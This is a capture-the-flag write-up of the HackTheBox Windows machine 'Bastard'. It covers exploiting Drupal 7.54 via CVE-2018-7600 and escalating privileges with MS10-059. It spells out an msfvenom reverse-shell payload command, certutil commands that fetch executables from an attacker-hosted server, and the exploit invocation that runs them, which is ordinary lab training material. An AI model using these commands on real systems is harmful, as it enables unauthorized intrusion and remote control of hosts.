---
title: Bastard Hackthebox Writeup
date: 2020-12-23 09:00:00 +0800
categories: [Hackthebox, Retired]
tags: [windows,drupal,rce,drupal 7.54,python exploit,windows exploit suggester]     # TAG names should always be lowercase
image: /assets/img/bastard-hackthebox/bastard-pic.png
subtitle: JHBDOcubeoveiubo
---


# Introduction@Access:~$


Column | Details
------------ | -------------
Name | Bastard
IP | 10.10.10.9
Points | 30
Os | Windows
Difficult | Medium
Creator | [ch4p](https://www.hackthebox.eu/home/users/profile/1)
Out on | 18th March 2017

# Summary:~$

* Discovering the new host and scanning for open ports.
* As it's a drupal website, looking for version which we got as `Drupal 7.54`.
* Looking for vulnerabilities, we found that RCE is possible on this version: `CVE-2018-7600`.
* By transfering an `exe` payload and we got a reverse connection back i.e `User Shell`.
* Escalating `Privileges` by using **Local windows exploit suggester**, which gave `MS10-059.exe` as one of the recommendations.

# Starting:~$

## Nmap

I have used **nmapAutomator** , which keeps the scanning fast and reduces effort.*(Not recommended in real life scenarios).* 

Dowload link: [nmapAutomator](https://github.com/21y4d/nmapAutomator)

___
![](/assets/img/bastard-hackthebox/nmap-scan-1.png)

Basically `3 Ports` are open i.e. `80,135,49154`. Let's access port 80 first.

___
![](/assets/img/bastard-hackthebox/website-homepage-2.png)

It is a `Drupal` webiste, checking `/robots.txt`.

___
![](/assets/img/bastard-hackthebox/robots-txt-4.png)

In this I found `/CHANGELOG.txt` file which showed which version of `Drupal` is installed.

___
![](/assets/img/bastard-hackthebox/got-version-name-6.png)

The version installed is `Drupal 7.54`, Searching for vulnerabilities I found this :

___
![](/assets/img/bastard-hackthebox/drupa-exploit-8.png)

[Link for the exploit](https://github.com/pimps/CVE-2018-7600)

After downloading the exploit on my system, I ran `whoami` as a remote execution command and I got `nt authority\iusr` as the result.

___
![](/assets/img/bastard-hackthebox/whoami-command-worked-10.png)

Now let's upload an exe shell to the machine and get a reverse connection back, before that we need to know the architecture of the machine which is `x64`.

___
![](/assets/img/bastard-hackthebox/systeminfo-x64-architecture-11.png)

Creating a `payload` using `msfvenom`

**Command** : *msfvenom -p windows/x64/shell_reverse_tcp  -a x64 LHOST=10.10.X.X LPORT=4444 -f exe --platform windows > shell.exe*

___
![](/assets/img/bastard-hackthebox/shell-msfvenom-command-12.png)

Transfering `shell.exe` via **certutil** command.

**certutil command** : *certutil -urlcache -split -f http://10.10.X.X:8081/shell.exe c:/windows/temp/shell.exe*

**Hosting Command** : *python3 -m http.server 8081*

**Final Command** : *python exploit.py http://10.10.10.9 -c "certutil -urlcache -split -f http://10.10.X.X:8081/shell.exe c:/windows/temp/shell.exe"*

___
![](/assets/img/bastard-hackthebox/transfered-shell-exe-13.png)

Executing `shell.exe` using the python exploit and listening on the specified port using `nc`. we got `User Shell`.

___
![](/assets/img/bastard-hackthebox/got-shell-14.png)

Let's gather `systeminfo` for Privilege Escalation.

___
![](/assets/img/bastard-hackthebox/getting-system-info-16.png)

Feeding the above information to `windows exploit suggester` which I had downloaded on my machine.

Download link : [windows-exploit-suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)

___
![](/assets/img/bastard-hackthebox/exploit-suggester-17.png)

Using `MS10-059.exe` to escalate privileges.

[Download Link](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS10-059/MS10-059.exe)

Sending the executable to windows machine using `certutil` command.

**Command** : *certutil -urlcache -split -f http://10.10.X.X:8081/MS10-059.exe c:/windows/temp/priv.exe*

___
![](/assets/img/bastard-hackthebox/certutil-priv-shell-18.png)

Running the `exploit` and we got `Root`.

___
![](/assets/img/bastard-hackthebox/got-root-shell-19.png)